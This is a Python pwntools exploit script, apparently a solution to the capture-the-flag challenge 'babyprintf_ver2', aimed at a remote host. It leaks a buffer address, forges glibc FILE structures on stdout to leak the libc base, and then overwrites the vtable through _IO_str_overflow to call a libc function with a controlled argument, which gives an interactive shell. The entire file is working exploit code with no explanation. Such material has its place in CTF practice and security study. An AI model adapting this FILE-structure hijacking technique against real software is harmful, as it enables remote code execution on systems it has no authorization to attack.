from pwn import *

#r = process('./babyprintf_ver2')
#r = remote('192.168.2.2', 1337)

r = remote('150.109.44.250', 20005)
#r.sendafter('Input your token:', 'token_here\n')

buffer_addr = int(r.recvuntil('\nHave fun!').split('\nHave fun!')[0].split(' 0x')[1], 16)

log.success('Buffer @ ' + hex(buffer_addr))

def pack_file(_flags = 0, #handy function to pack files that i got from https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

fake_stdout_file_struct = ''
fake_stdout_file_struct += pack_file(
							_flags = 0xfbad2887,
							_IO_write_base = buffer_addr - 0x18,
							_IO_write_ptr = buffer_addr - 0x18 + 8,
							_IO_read_end = buffer_addr - 0x18,
							_fileno = 1,
							_lock = buffer_addr + 0x600
							)
fake_stdout_file_struct += p64(0x0) #vtable
fake_stdout_file_struct = fake_stdout_file_struct.ljust(0x100, '\x00')

payload = ''
payload += p64(0x0)*2
payload += p64(buffer_addr + 0x20)
payload += p64(0x0)
payload += fake_stdout_file_struct

r.send(payload + '\n')

r.sendafter('rewrite vtable is not permitted!', 'pwn\n')

libc = u64(r.recvuntil('pwn').split('pwn')[0][1:]) - 0x43520

log.success('Libc @ ' + hex(libc))

fake_stdout_file_struct = ''
fake_stdout_file_struct += pack_file(
							_flags = 0xfbad2887,
							_fileno = 1,
							_lock = buffer_addr + 0x600,
							_IO_write_base = buffer_addr + 0xf8,
							_IO_write_ptr = buffer_addr + 0xf8,
							_IO_write_end = buffer_addr + 0xf8 + 0x8
							)
fake_stdout_file_struct += p64(0x0) #vtable
fake_stdout_file_struct += p64(0x1337c0de)

payload = ''
payload += p64(0x0)*2
payload += p64(buffer_addr + 0x20)
payload += p64(0x0)
payload += fake_stdout_file_struct

print len(payload)

pause()

r.send(payload + '\n')

io_str_overflow_ptr_addr = libc + 0x3e7ef8

fake_vtable_addr = io_str_overflow_ptr_addr - 0x38

print hex(fake_vtable_addr)

r.send(p64(fake_vtable_addr) + '\n')

rip = libc + 0x4f440
rdi = libc + 0x13fe6

fake_stdout_file_struct = ''
fake_stdout_file_struct += pack_file(
	_IO_buf_base = 0,
	_IO_buf_end = (rdi-100)/2,
	_IO_write_ptr = (rdi-100)/2,
	_IO_write_base = 0,
	_lock = buffer_addr + 0x600)
fake_stdout_file_struct += p64(fake_vtable_addr) #vtable
fake_stdout_file_struct += p64(rip)

payload = ''
payload += p64(0x0)*2
payload += p64(buffer_addr + 0x20)
payload += p64(0x0)
payload += fake_stdout_file_struct

r.send(payload + '\n')

r.interactive()
